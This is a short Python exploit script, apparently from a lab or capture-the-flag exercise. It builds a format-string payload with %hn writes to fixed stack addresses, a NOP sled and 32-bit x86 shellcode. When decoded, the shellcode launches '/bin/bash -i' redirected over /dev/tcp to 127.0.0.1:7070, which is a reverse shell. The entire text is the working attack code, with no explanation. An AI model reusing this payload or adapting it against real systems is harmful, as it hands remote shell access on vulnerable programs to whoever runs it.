#!usr/bin/env python
import sys

shellcode = '\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x682>&1\x68<&1 \x6870 0\x681/70\x680.0.\x68127.\x68tcp/\x68dev/\x68 > /\x68h -i\x68/bas\x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'
nop = '\x90'
nop_n = 0x100

shellcode_addr = 0xbffff3f0 + 0x100
high_adr,low_adr = divmod(shellcode_addr,0x10000)
fill1 = low_adr - 8 if low_adr > 8 else low_adr + 0x10000 - 8
fill2 = high_adr - low_adr if high_adr > low_adr else high_adr + 0x10000 - low_adr

print ('\x1c\xf3\xff\xbf\x1e\xf3\xff\xbf%'+str(fill1)+'x%64$hn%'+str(fill2)+'x%65$hn'+nop*nop_n+shellcode)
